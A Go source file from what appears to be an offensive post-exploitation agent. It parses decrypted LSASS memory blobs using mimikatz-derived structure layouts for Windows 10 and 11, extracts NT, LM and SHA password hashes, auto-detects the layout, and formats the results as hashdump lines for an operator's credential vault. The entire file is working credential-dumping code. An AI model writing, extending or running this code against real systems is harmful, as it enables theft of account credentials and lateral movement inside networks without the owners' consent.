package commands

// KIWI_MSV1_0_PRIMARY_CREDENTIAL_10_NEW plaintext parser — Phase 2C-ii-c.
//
// After Phase 2C-ii-c decrypts a ciphertext blob captured by Phase 2C-ii-a,
// the plaintext is a KIWI_MSV1_0_PRIMARY_CREDENTIAL_10_xxx struct followed by
// a variable-length trailing buffer holding the UTF-16 character data for
// LogonDomainName + UserName. This file overlays the Win10 1607+ / Win11 23H2
// layout (mimikatz "_10_NEW" / "_10_1607") and surfaces NT/LM/SHA hash bytes
// plus the four BOOLEAN validity flags.
//
// Layout (x64, fixed part = 0x7E = 126 bytes):
//
//	+0x00  LSA_UNICODE_STRING LogonDomainName     (16 bytes)
//	+0x10  LSA_UNICODE_STRING UserName            (16 bytes)
//	+0x20  PVOID              pNtlmCredIsoInProc  (8 bytes)
//	+0x28  BOOLEAN            isIso
//	+0x29  BOOLEAN            isNtOwfPassword
//	+0x2A  BOOLEAN            isLmOwfPassword
//	+0x2B  BOOLEAN            isShaOwPassword
//	+0x2C  BOOLEAN            isDPAPIProtected
//	+0x2D  BYTE               align0
//	+0x2E  BYTE               align1
//	+0x2F  BYTE               align2
//	+0x30  DWORD              unkD
//	+0x34  USHORT             isoSize             (#pragma pack(2) from here)
//	+0x36  BYTE               DPAPIProtected[16]
//	+0x46  DWORD              align3
//	+0x4A  BYTE               NtOwfPassword[16]
//	+0x5A  BYTE               LmOwfPassword[16]
//	+0x6A  BYTE               ShaOwPassword[20]
//	total fixed                                   126 bytes
//
// Reference: mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_msv1_0.h.
// The same file defines `_10_OLD`, `_10` (1511..1606), and `_26100` (Win11
// 24H2+) variants — additional layouts can be added here following the same
// pattern, with selection driven by either build-number or layout-tag
// heuristics. For now Phase 2C-ii-c targets the 1607..23H2 range that the
// rest of the LSASS pipeline is calibrated for.

import (
	"encoding/binary"
	"fmt"
)

// primaryCredential10Layout describes the field offsets of a single
// KIWI_MSV1_0_PRIMARY_CREDENTIAL_10_xxx layout. Phase 2C-ii-c ships exactly
// one (the 1607+ "_10_NEW" variant); future Windows builds with shifted
// offsets should ship as additional layouts in this struct rather than
// mutating constants.
type primaryCredential10Layout struct {
	Name           string // descriptive label for diagnostics
	FixedSize      int    // fixed-part byte count (excluding trailing buffer)
	LogonDomainOff int    // LSA_UNICODE_STRING (16 bytes)
	UserNameOff    int    // LSA_UNICODE_STRING (16 bytes)
	IsIsoOff       int    // BOOLEAN
	IsNtOff        int    // BOOLEAN
	IsLmOff        int    // BOOLEAN
	IsShaOff       int    // BOOLEAN
	NtHashOff      int    // 16 bytes
	LmHashOff      int    // 16 bytes
	ShaHashOff     int    // 20 bytes
}

// PrimaryCredential10NewLayout is the layout for Win10 1607 .. Win11 23H2
// (mimikatz `_10_1607` / `_10_NEW`).
var PrimaryCredential10NewLayout = primaryCredential10Layout{
	Name:           "PrimaryCredential_10_NEW",
	FixedSize:      0x7E,
	LogonDomainOff: 0x00,
	UserNameOff:    0x10,
	IsIsoOff:       0x28,
	IsNtOff:        0x29,
	IsLmOff:        0x2A,
	IsShaOff:       0x2B,
	NtHashOff:      0x4A,
	LmHashOff:      0x5A,
	ShaHashOff:     0x6A,
}

// PrimaryCredential10Layout is the layout for Win10 1511-1606
// (mimikatz `_10`). Same as _10_NEW but without isoSize and DPAPIProtected
// fields, so hashes are at lower offsets.
var PrimaryCredential10Layout = primaryCredential10Layout{
	Name:           "PrimaryCredential_10",
	FixedSize:      0x68,
	LogonDomainOff: 0x00,
	UserNameOff:    0x10,
	IsIsoOff:       0x28,
	IsNtOff:        0x29,
	IsLmOff:        0x2A,
	IsShaOff:       0x2B,
	NtHashOff:      0x34,
	LmHashOff:      0x44,
	ShaHashOff:     0x54,
}

// PrimaryCredential10OldLayout is the layout for Win10 1507 RTM
// (mimikatz `_10_OLD`). No pNtlmCredIsoInProc pointer, no ISO fields.
var PrimaryCredential10OldLayout = primaryCredential10Layout{
	Name:           "PrimaryCredential_10_OLD",
	FixedSize:      0x60,
	LogonDomainOff: 0x00,
	UserNameOff:    0x10,
	IsIsoOff:       -1, // Not present in this layout
	IsNtOff:        0x20,
	IsLmOff:        0x21,
	IsShaOff:       0x22,
	NtHashOff:      0x2C,
	LmHashOff:      0x3C,
	ShaHashOff:     0x4C,
}

// primaryCredentialLayouts lists all known layouts in preference order.
// Auto-detection tries each and picks the first with plausible header fields.
var primaryCredentialLayouts = []primaryCredential10Layout{
	PrimaryCredential10NewLayout,
	PrimaryCredential10Layout,
	PrimaryCredential10OldLayout,
}

const (
	primaryCredHashLenNT  = 16
	primaryCredHashLenLM  = 16
	primaryCredHashLenSHA = 20
)

// primaryCredential10 is the structured projection of a decrypted
// KIWI_MSV1_0_PRIMARY_CREDENTIAL_10_NEW. Only the fields that map to the
// `dump`-action text format and the operator-readable flags are surfaced;
// the trailing UTF-16 character buffer for LogonDomainName / UserName is
// deliberately not parsed here — Phase 2C-ii-a already captured the same
// strings from the outer KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC envelope, so the
// orchestrator uses the outer envelope's UserName/Domain when emitting the
// dump-compatible text block. This avoids a second remote read and sidesteps
// the dangling LSASS-virtual Buffer pointer left embedded in the decrypted
// plaintext.
type primaryCredential10 struct {
	Layout          string
	IsIso           bool
	IsNtOwfPassword bool
	IsLmOwfPassword bool
	IsShaOwPassword bool
	NtOwfPassword   [primaryCredHashLenNT]byte
	LmOwfPassword  [primaryCredHashLenLM]byte
	ShaOwPassword [primaryCredHashLenSHA]byte
	// LogonDomainHeaderLength / UserNameHeaderLength surface the LSA_UNICODE_STRING
	// .Length fields from the decrypted blob's header. Useful for layout-drift
	// triage — implausible values (odd, > 1024, > MaxLength) flag a wrong layout
	// before any hash bytes are emitted.
	LogonDomainHeaderLength uint16
	LogonDomainHeaderMaxLen uint16
	UserNameHeaderLength    uint16
	UserNameHeaderMaxLen    uint16
}

// parsePrimaryCredential10New overlays the Win10 1607+ / Win11 23H2 layout on
// `plaintext` (the decrypted output of decryptLsaProtectedMemory). Returns an
// error only when the plaintext is shorter than the fixed part — the field
// extraction itself is total over the layout window.
//
// The returned struct is safe to read even when the plaintext is total
// garbage (wrong key / wrong layout / wrong build). Callers should
// cross-reference IsNtOwfPassword == true + non-zero NtOwfPassword bytes
// before treating the hash as authoritative; an all-zero hash with the flag
// unset usually means the credential entry is shaped for a different
// AuthPackage (Kerberos secrets, WDigest plaintext, etc.) where the MSV1_0
// hash slot is unused.
func parsePrimaryCredential10New(plaintext []byte) (primaryCredential10, error) {
	return parsePrimaryCredential10(plaintext, PrimaryCredential10NewLayout)
}

func parsePrimaryCredential10(plaintext []byte, layout primaryCredential10Layout) (primaryCredential10, error) {
	var p primaryCredential10
	if len(plaintext) < layout.FixedSize {
		return p, fmt.Errorf("plaintext too short for layout %q: got %d, need >= %d",
			layout.Name, len(plaintext), layout.FixedSize)
	}
	p.Layout = layout.Name
	if layout.IsIsoOff >= 0 {
		p.IsIso = plaintext[layout.IsIsoOff] != 0
	}
	p.IsNtOwfPassword = plaintext[layout.IsNtOff] != 0
	p.IsLmOwfPassword = plaintext[layout.IsLmOff] != 0
	p.IsShaOwPassword = plaintext[layout.IsShaOff] != 0
	copy(p.NtOwfPassword[:], plaintext[layout.NtHashOff:layout.NtHashOff+primaryCredHashLenNT])
	copy(p.LmOwfPassword[:], plaintext[layout.LmHashOff:layout.LmHashOff+primaryCredHashLenLM])
	copy(p.ShaOwPassword[:], plaintext[layout.ShaHashOff:layout.ShaHashOff+primaryCredHashLenSHA])

	// Surface the LSA_UNICODE_STRING headers for layout-drift diagnostics. We
	// don't dereference the .Buffer pointer here — that's an LSASS-virtual
	// address whose semantics post-decryption are not interesting (the outer
	// PRIMARY_CREDENTIAL_ENC envelope already holds the live username/domain
	// strings).
	p.LogonDomainHeaderLength = binary.LittleEndian.Uint16(plaintext[layout.LogonDomainOff : layout.LogonDomainOff+2])
	p.LogonDomainHeaderMaxLen = binary.LittleEndian.Uint16(plaintext[layout.LogonDomainOff+2 : layout.LogonDomainOff+4])
	p.UserNameHeaderLength = binary.LittleEndian.Uint16(plaintext[layout.UserNameOff : layout.UserNameOff+2])
	p.UserNameHeaderMaxLen = binary.LittleEndian.Uint16(plaintext[layout.UserNameOff+2 : layout.UserNameOff+4])
	return p, nil
}

// allZeroBytes returns true if every byte in `b` is zero. Used to filter
// placeholder hash slots (an unset NtOwfPassword on a non-MSV1_0 AuthPackage
// is sixteen zeros) before emitting credential lines.
func allZeroBytes(b []byte) bool {
	for _, x := range b {
		if x != 0 {
			return false
		}
	}
	return true
}

// hashdumpDumpLine formats a credential as the `username:rid:lm:nt:::` text
// block consumed by agentfunctions/hashdump.go's ProcessResponse hook. The
// 32-char "no LM" placeholder is emitted when IsLmOwfPassword is false (a
// modern Win10/11 credential has no LM hash).
//
// Returns "" if the username is empty or the NT hash is all-zero — those
// entries are not actionable as credentials and should not be added to the
// vault.
func hashdumpDumpLine(username string, ntHash, lmHash [16]byte, hasLm bool) string {
	if username == "" {
		return ""
	}
	if allZeroBytes(ntHash[:]) {
		return ""
	}
	const noLM = "aad3b435b51404eeaad3b435b51404ee"
	lmHex := noLM
	if hasLm && !allZeroBytes(lmHash[:]) {
		lmHex = hexLower(lmHash[:])
	}
	return fmt.Sprintf("%s:0:%s:%s:::", username, lmHex, hexLower(ntHash[:]))
}

// detectPrimaryCredentialLayout tries each known layout against the decrypted
// plaintext and returns the first one whose LSA_UNICODE_STRING header fields
// look plausible (even lengths, MaxLength >= Length, reasonable bounds). Falls
// back to PrimaryCredential10NewLayout if no layout passes the heuristic.
func detectPrimaryCredentialLayout(plaintext []byte) primaryCredential10Layout {
	for _, layout := range primaryCredentialLayouts {
		if len(plaintext) < layout.FixedSize {
			continue
		}
		if isPlausibleCredLayout(plaintext, layout) {
			return layout
		}
	}
	return PrimaryCredential10NewLayout
}

func isPlausibleCredLayout(plaintext []byte, layout primaryCredential10Layout) bool {
	domainLen := binary.LittleEndian.Uint16(plaintext[layout.LogonDomainOff : layout.LogonDomainOff+2])
	domainMax := binary.LittleEndian.Uint16(plaintext[layout.LogonDomainOff+2 : layout.LogonDomainOff+4])
	userLen := binary.LittleEndian.Uint16(plaintext[layout.UserNameOff : layout.UserNameOff+2])
	userMax := binary.LittleEndian.Uint16(plaintext[layout.UserNameOff+2 : layout.UserNameOff+4])

	if domainLen%2 != 0 || userLen%2 != 0 {
		return false
	}
	if domainLen > domainMax || userLen > userMax {
		return false
	}
	if domainLen > 512 || userLen > 512 {
		return false
	}
	ntIsSet := plaintext[layout.IsNtOff]
	if ntIsSet != 0 && ntIsSet != 1 {
		return false
	}
	return true
}

// hexLower formats bytes as lowercase hex without any separators. encoding/hex
// already returns lowercase by default; this helper exists so the caller can
// pass arrays directly without a slice conversion at every call site.
func hexLower(b []byte) string {
	const hexdigits = "0123456789abcdef"
	out := make([]byte, len(b)*2)
	for i, c := range b {
		out[i*2] = hexdigits[c>>4]
		out[i*2+1] = hexdigits[c&0x0F]
	}
	return string(out)
}
